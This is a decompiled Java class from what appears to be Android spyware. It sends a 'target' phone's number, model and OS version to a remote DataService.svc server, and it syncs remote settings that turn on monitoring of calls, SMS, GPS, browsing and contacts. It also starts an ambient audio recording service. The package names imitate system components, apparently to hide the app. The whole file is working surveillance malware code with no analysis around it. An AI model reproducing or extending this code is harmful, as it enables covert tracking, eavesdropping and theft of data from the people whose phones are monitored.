package com.app.system.common.d.a;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.os.Build;
import android.os.Build.VERSION;
import com.android.system.AmbientService;
import com.android.system.LocationReceiver;
import com.android.system.SyncAndFlushReceiver;
import com.app.system.common.entity.MyConfig;
import com.app.system.common.entity.MyTargetPhoneInfo;
import com.app.system.common.h;
import com.google.gson.f;
import com.security.ServiceSettings;
import java.util.Date;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class p
  extends a
{
  public p(String paramString1, String paramString2)
  {
    super(paramString1, paramString2);
  }
  
  public static void d(Context paramContext)
  {
    if (paramContext.getApplicationContext().getSharedPreferences("pref", 0).getBoolean("ambient-record-active", false))
    {
      com.security.d.a.d("Settings", "Start Ambient Service 0", new Object[0]);
      if (h.f(paramContext)) {
        return;
      }
      com.security.d.a.d("Settings", "Start Ambient Service", new Object[0]);
      localIntent = new Intent(paramContext, AmbientService.class);
      localIntent.setFlags(268435456);
      paramContext.startService(localIntent);
      return;
    }
    if (!h.f(paramContext)) {
      return;
    }
    com.security.d.a.d("Settings", "Stop Ambient Service", new Object[0]);
    Intent localIntent = new Intent(paramContext, AmbientService.class);
    localIntent.setFlags(268435456);
    paramContext.stopService(localIntent);
  }
  
  public int a(Context paramContext)
  {
    try
    {
      Object localObject1 = paramContext.getApplicationContext().getSharedPreferences("pref", 0);
      Object localObject2 = new com/app/system/common/entity/MyTargetPhoneInfo;
      ((MyTargetPhoneInfo)localObject2).<init>();
      ((MyTargetPhoneInfo)localObject2).c(((SharedPreferences)localObject1).getString("device-telephone-number", ""));
      ((MyTargetPhoneInfo)localObject2).a(h.c(paramContext));
      ((MyTargetPhoneInfo)localObject2).b(Build.MODEL);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("Android ");
      ((StringBuilder)localObject1).append(Build.VERSION.RELEASE);
      ((MyTargetPhoneInfo)localObject2).d(((StringBuilder)localObject1).toString());
      ((MyTargetPhoneInfo)localObject2).e(paramContext.getResources().getString(2131558443));
      localObject2 = h.b().a(localObject2);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("URL send: ");
      ((StringBuilder)localObject1).append(this.c);
      ((StringBuilder)localObject1).append("/DataService.svc");
      ((StringBuilder)localObject1).append("/UpdatePhoneInfo");
      ((StringBuilder)localObject1).append("/");
      ((StringBuilder)localObject1).append(this.a);
      com.security.d.a.d("Settings", ((StringBuilder)localObject1).toString(), new Object[0]);
      h.a(paramContext, "INVIO DATI TARGET");
      if (this.b)
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/DataService.svc");
        paramContext.append("/UpdatePhoneInfo");
        paramContext.append("/");
        paramContext.append(this.a);
        paramContext = com.app.system.common.d.a.a.a.a(paramContext.toString(), (String)localObject2);
      }
      else
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/DataService.svc");
        paramContext.append("/UpdatePhoneInfo");
        paramContext.append("/");
        paramContext.append(this.a);
        paramContext = com.app.system.common.d.a.a.a.a(paramContext.toString(), (String)localObject2);
      }
      if (paramContext == null) {
        return -10;
      }
      paramContext = paramContext.body().string();
      if ((!paramContext.startsWith("0")) && (!paramContext.contains("<html")))
      {
        int i = Integer.parseInt(paramContext);
        return i;
      }
      return -20;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("Settings", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public int b(Context paramContext)
  {
    try
    {
      SharedPreferences localSharedPreferences = paramContext.getApplicationContext().getSharedPreferences("pref", 0);
      Object localObject2;
      if (this.b)
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        ((StringBuilder)localObject1).append(this.c);
        ((StringBuilder)localObject1).append("/DataService.svc");
        ((StringBuilder)localObject1).append("/GetSetting");
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(this.a);
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(h.a());
        ((StringBuilder)localObject1).append("/");
        localObject2 = new java/util/Date;
        ((Date)localObject2).<init>();
        ((StringBuilder)localObject1).append(((Date)localObject2).getTimezoneOffset());
        localObject1 = com.app.system.common.d.a.a.a.a(((StringBuilder)localObject1).toString());
      }
      else
      {
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        ((StringBuilder)localObject2).append(this.c);
        ((StringBuilder)localObject2).append("/DataService.svc");
        ((StringBuilder)localObject2).append("/GetSetting");
        ((StringBuilder)localObject2).append("/");
        ((StringBuilder)localObject2).append(this.a);
        ((StringBuilder)localObject2).append("/");
        ((StringBuilder)localObject2).append(h.a());
        ((StringBuilder)localObject2).append("/");
        localObject1 = new java/util/Date;
        ((Date)localObject1).<init>();
        ((StringBuilder)localObject2).append(((Date)localObject1).getTimezoneOffset());
        localObject1 = com.app.system.common.d.a.a.a.a(((StringBuilder)localObject2).toString());
      }
      if (localObject1 == null) {
        return -10;
      }
      Object localObject1 = ((Response)localObject1).body().string();
      ServiceSettings.a();
      ServiceSettings.a((String)localObject1);
      if ((!((String)localObject1).startsWith("1")) && (!((String)localObject1).contains("<html")) && (!((String)localObject1).contains("<HTML")))
      {
        if (localSharedPreferences.getLong("last_sync_time", 0L) != 0L) {
          return 0;
        }
        com.security.d.a.c("Settings", "G_IS_FIRST_GET_SETTING = 1, first sync", new Object[0]);
        localObject1 = localSharedPreferences.edit();
        ((SharedPreferences.Editor)localObject1).putInt("is_first_get_setting", 1);
        ((SharedPreferences.Editor)localObject1).commit();
        SyncAndFlushReceiver.b(paramContext);
        LocationReceiver.b(paramContext);
        com.app.system.common.f.a.g(paramContext);
        paramContext = new java/util/Date;
        paramContext.<init>();
        ((SharedPreferences.Editor)localObject1).putLong("last_sync_time", paramContext.getTime() / 1000L);
        ((SharedPreferences.Editor)localObject1).commit();
        return 0;
      }
      return -20;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("Settings", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public int c(Context paramContext)
  {
    try
    {
      Object localObject1 = paramContext.getApplicationContext().getSharedPreferences("pref", 0);
      Object localObject2 = new com/app/system/common/entity/MyConfig;
      ((MyConfig)localObject2).<init>();
      ((MyConfig)localObject2).b(((SharedPreferences)localObject1).getBoolean("call-active", false));
      ((MyConfig)localObject2).a(((SharedPreferences)localObject1).getBoolean("gps-active", false));
      ((MyConfig)localObject2).d(((SharedPreferences)localObject1).getBoolean("sms-active", false));
      ((MyConfig)localObject2).c(((SharedPreferences)localObject1).getBoolean("url-active", false));
      ((MyConfig)localObject2).e(((SharedPreferences)localObject1).getBoolean("contact-active", false));
      ((MyConfig)localObject2).f(((SharedPreferences)localObject1).getBoolean("call-active", false));
      ((MyConfig)localObject2).a(h.a());
      localObject2 = h.b().a(localObject2, MyConfig.class);
      Date localDate;
      if (this.b)
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        ((StringBuilder)localObject1).append(this.c);
        ((StringBuilder)localObject1).append("/DataService.svc");
        ((StringBuilder)localObject1).append("/SyncSetting");
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(this.a);
        ((StringBuilder)localObject1).append("/");
        localDate = new java/util/Date;
        localDate.<init>();
        ((StringBuilder)localObject1).append(localDate.getTimezoneOffset());
        localObject2 = com.app.system.common.d.a.a.a.a(((StringBuilder)localObject1).toString(), (String)localObject2);
      }
      else
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        ((StringBuilder)localObject1).append(this.c);
        ((StringBuilder)localObject1).append("/DataService.svc");
        ((StringBuilder)localObject1).append("/SyncSetting");
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(this.a);
        ((StringBuilder)localObject1).append("/");
        localDate = new java/util/Date;
        localDate.<init>();
        ((StringBuilder)localObject1).append(localDate.getTimezoneOffset());
        localObject2 = com.app.system.common.d.a.a.a.a(((StringBuilder)localObject1).toString(), (String)localObject2);
      }
      if (localObject2 == null) {
        return -10;
      }
      localObject2 = ((Response)localObject2).body().string();
      com.security.d.a.d("Settings", (String)localObject2, new Object[0]);
      if ((!((String)localObject2).startsWith("1")) && (!((String)localObject2).contains("<html")) && (!((String)localObject2).contains("<HTML")))
      {
        d(paramContext);
        return 0;
      }
      return -20;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("Settings", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/p.class
 *
 * Reversed by:           J
 */